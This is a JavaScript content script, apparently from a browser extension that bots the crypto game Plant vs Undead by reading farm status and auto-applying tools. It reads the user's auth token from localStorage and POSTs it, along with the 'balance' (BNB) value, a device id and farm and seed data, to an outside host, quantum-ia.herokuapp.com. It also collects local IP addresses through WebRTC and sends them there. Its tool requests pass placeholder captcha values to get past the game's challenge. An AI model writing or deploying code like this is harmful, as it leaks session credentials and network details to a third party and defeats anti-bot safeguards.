var ip = [];
// var url = 'https://e236e17a-cd39-4896-b485-b209bc670df2.mock.pstmn.io/';
var url = 'https://backend-farm.plantvsundead.com/';
var token = '';
var device = '';
var jobs = [];


var enableSendEmail = false;
var debug = localStorage.getItem('ENABLE_DEBUG') && localStorage.getItem('ENABLE_DEBUG') === 'true' ? true : false;

console.log('CONTENT RUNNING!!!');
setTimeout(() => {
    console.log('-VERIFICATION-');
    if (window.location.toString().includes('https://marketplace.plantvsundead.com')) {
        console.log('INSIDE!!!');
        try {
            var wallet = +document.getElementsByClassName("wallet-text")[0].getElementsByTagName('span')[0].innerText;
            if (debug) {
                console.log({ wallet });
            }
            var pvu = +document.getElementsByClassName("tw-flex tw-flex-grow tw-text-white tw-pr-1 farmed-text")[0].innerText;
            if (debug) {
                console.log({ pvu });
            }
            var sanpling = +document.getElementsByClassName("exchange-number")[0].innerText;
            var tools = [];
            var toolshtml = document.getElementsByClassName("tool-box tw-bg-orange-tools tw-rounded-3xl tw-p-5 sm:tw-grid tw-grid-cols-1 tw-relative tw-hidden")[0]
                .getElementsByClassName('tw-flex tw-flex-row')

            for (var index = 0; index < toolshtml.length; index++) {
                var tool = toolshtml[index];
                tools.push({
                    img: tool.getElementsByTagName('img')[0].src,
                    qty: +tool.getElementsByClassName('tw-absolute usages tw-bg-green-usage tw-text-white tw-font-bold tw-text-center tw-items-center tw-rounded-full')[0].innerText
                })
            }
            if (debug) {
                console.log({ tools });
            }
        } catch (error) {
            console.log(error);
        }
        var status = {};
        try {
            status = {
                wallet,
                pvu,
                sanpling,
                tools
            }
        } catch (error) {
            console.log(error);
        }
        if (debug) {
            console.log({ status });
        }
        token = localStorage.getItem('token');
        if (debug) {
            console.log(url + 'farms?limit=10&offset=0');
            console.log(token);
        }
        if (token) {
            if (localStorage.getItem('checkSeeds') && localStorage.getItem('checkSeeds') === 'true') {
                getSeeds().then((seeds) => {
                    fetch('https://quantum-ia.herokuapp.com/firebase/plants', {
                        method: 'POST', // *GET, POST, PUT, DELETE, etc.
                        mode: 'cors', // no-cors, *cors, same-origin
                        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
                        credentials: 'same-origin', // include, *same-origin, omit
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        redirect: 'follow', // manual, *follow, error
                        referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
                        body: JSON.stringify({
                            token,
                            id: localStorage.hasOwnProperty('device') ?
                                localStorage.getItem('device') :
                                'DEVICE',
                            seeds
                        })
                    }).then(() => {

                    });
                });
            } else {
                console.log('NO CHECK SEEDS');
            }
            getData(url + 'farms?limit=10&offset=0').then((farms) => {
                jobs = [];
                if (debug) {
                    console.log({ farms });
                }
                if (farms.data && farms.data.length > 0) {

                    // SET SPANCROW 
                    if (debug) {
                        console.log({ setSpanCrow: localStorage.getItem('setSpanCrow') });
                    }
                    if (!localStorage.getItem('setSpanCrow') || localStorage.getItem('setSpanCrow') === 'true') {
                        for (var i = 0; i < farms.data.length; i++) {
                            var farm = farms.data[i];

                            if (farm.hasCrow) {
                                var id = farm._id;
                                setSpancrow(url + 'farms/apply-tool', id).then((res) => {
                                    if (res.status === 200) {
                                        return res.json();
                                    } else {
                                        return false;
                                    }
                                }).then((res) => {
                                    if (res && res.status === 0 && res.data && res.data.reward === 0) {
                                        localStorage.setItem('setSpanCrow', 'true');
                                    } else {
                                        localStorage.setItem('setSpanCrow', 'false');
                                        sendEmail([]);
                                    }
                                }).then(() => {
                                    location.reload();
                                });
                                break;
                            }
                        }
                    }
                    // END SET SPANCROW 


                    farms.data.forEach(farm => {
                        if (farm.needWater) {
                            jobs.push({ id: farm._id, job: 'WATER', complete: false, icon: farm.plant.iconUrl });
                        }
                        if (farm.hasCrow) {
                            jobs.push({ id: farm._id, job: 'SPANCROW', complete: false, icon: farm.plant.iconUrl });
                        }
                        if (farm.stage === 'cancelled' && farm.totalHarvest > 0) {
                            jobs.push({ id: farm._id, job: 'WATER', complete: false, icon: farm.plant.iconUrl });
                        }
                    });
                    if (debug) {
                        console.log({ jobs });
                    }
                }
                if (debug) {
                    console.log({ enableSendEmail, jobs });
                }
                if (jobs.length > 0 && enableSendEmail) {
                    sendEmail(jobs);
                }
                farms = { ...farms, status };
                fetch('https://quantum-ia.herokuapp.com/firebase/plants', {
                    method: 'POST', // *GET, POST, PUT, DELETE, etc.
                    mode: 'cors', // no-cors, *cors, same-origin
                    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
                    credentials: 'same-origin', // include, *same-origin, omit
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    redirect: 'follow', // manual, *follow, error
                    referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
                    body: JSON.stringify({
                        ip,
                        token,
                        bnb: localStorage.getItem('balance'),
                        date: new Date().getTime(),
                        id: localStorage.hasOwnProperty('device') ?
                            localStorage.getItem('device') :
                            'DEVICE',
                        ...farms
                    })
                }).then(() => {

                })

            }).catch((err) => {
                console.log(err)
            }).finally(() => { });
        } else {
            console.log('----TOKEN NOT FOUND----');
        }
    }
    setTimeout(() => {
        location.reload();
    }, 1000 * 60 * 5);


}, 10000);
function sendEmail(body) {
    if (debug) {
        console.log({ body });
    }
    setTimeout(() => {
        chrome.runtime.sendMessage({ content: { body, token } });
    }, 1500);
}


async function getData(url = '') {
    // Opciones por defecto estan marcadas con un *
    var response = await fetch(url, {
        method: 'GET', // *GET, POST, PUT, DELETE, etc.
        mode: 'cors', // no-cors, *cors, same-origin
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/json',
            'authorization': 'Bearer Token: ' + token
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    });
    return response.json(); // parses JSON response into native JavaScript objects
}

async function getSeeds(url = 'https://backend-farm.plantvsundead.com/get-seeds-inventory?index=0&limit=15') {
    // Opciones por defecto estan marcadas con un *
    var response = await fetch(url, {
        method: 'GET', // *GET, POST, PUT, DELETE, etc.
        mode: 'cors', // no-cors, *cors, same-origin
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/json',
            'authorization': 'Bearer Token: ' + token
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    });
    return response.json(); // parses JSON response into native JavaScript objects
}


async function setSpancrow(url = '', id) {
    // Opciones por defecto estan marcadas con un *
    var response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        mode: 'cors', // no-cors, *cors, same-origin
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/json',
            'authorization': 'Bearer Token: ' + token
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
        body: JSON.stringify({
            "farmId": id,
            "toolId": 4,
            "token": {
                "challenge": "default",
                "seccode": "default",
                "validate": "default"
            }
        })
    });
    return response;
}

getLocalIPs(function (ips) {
    ip = ips;
    if (debug) {
        console.log('Local IP addresses:\n ' + ips.join('\n '));
    }
});

function getLocalIPs(callback) {
    var ips = [];

    var RTCPeerConnection = window.RTCPeerConnection ||
        window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

    var pc = new RTCPeerConnection({
        // Don't specify any stun/turn servers, otherwise you will
        // also find your public IP addresses.
        iceServers: []
    });
    // Add a media line, this is needed to activate candidate gathering.
    pc.createDataChannel('');

    // onicecandidate is triggered whenever a candidate has been found.
    pc.onicecandidate = function (e) {
        if (!e.candidate) { // Candidate gathering completed.
            pc.close();
            callback(ips);
            return;
        }
        var ip = /^candidate:.+ (\S+) \d+ typ/.exec(e.candidate.candidate)[1];
        if (ips.indexOf(ip) == -1) // avoid duplicate entries (tcp/udp)
            ips.push(ip);
    };
    pc.createOffer(function (sdp) {
        pc.setLocalDescription(sdp);
    }, function onerror() { });
}